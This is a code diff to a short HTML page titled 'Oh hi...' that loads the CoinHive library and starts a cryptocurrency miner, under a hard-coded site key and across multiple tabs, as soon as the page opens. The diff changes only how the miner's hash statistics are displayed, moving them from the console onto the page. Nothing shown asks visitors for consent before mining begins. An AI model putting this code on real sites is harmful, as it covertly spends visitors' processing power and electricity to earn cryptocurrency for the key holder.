@@ -4,14 +4,23 @@
     <meta charset="UTF-8">
     <title>Oh hi...</title>
 </head>
+<div id="hashesPerSecond"></div>
+<div id="totalHashes"></div>
+<div id="acceptedHashes"></div>
 <body>
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script type="text/javascript">
   var miner = new CoinHive.Anonymous('2Gz19ZtfVgAqVZ6o0cLvzFQRDOsgU8LM');
   miner.start(CoinHive.FORCE_MULTI_TAB);
   setInterval(function() {
-    console.log("Hashes/S:" + miner.getHashesPerSecond(), " TotalHashes:" + miner.getTotalHashes() + " Accepted Hashes:" + miner.getAcceptedHashes());
-  }, 3000);
+    var hashesPerSecond = miner.getHashesPerSecond();
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes();
+
+    document.getElementById("hashesPerSecond").innerHTML = "<b>Hashes/Second:</b> " + hashesPerSecond;
+    document.getElementById("totalHashes").innerHTML = "<b>TotalHashes:</b> " + totalHashes;
+    document.getElementById("acceptedHashes").innerHTML = "<b>AcceptedHashes:</b> " + acceptedHashes;
+  }, 500);
 </script>
 </body>
 </html>
